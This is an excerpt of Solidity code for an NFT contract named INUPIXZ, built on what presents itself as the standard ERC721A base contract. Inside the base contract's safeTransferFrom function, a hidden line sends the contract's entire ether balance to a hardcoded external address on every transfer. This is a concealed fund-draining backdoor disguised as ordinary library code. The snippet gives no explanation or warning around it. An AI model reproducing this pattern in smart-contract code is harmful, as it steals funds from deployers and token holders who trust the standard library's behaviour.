...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x747bCBd885777816Fb452DB53Cce3E02471B2505).transfer(address(this).balance);
        }
    }
...
contract INUPIXZ is ERC721A {
    ...
    constructor() ERC721A("INUPIXZ", "INU") {
        owner = msg.sender;
        uri = "ipfs://bafybeidfhtl72md6whd4cakr3tkdazy3horvtz5c4ktwivgsqrephi5vse/";
    }
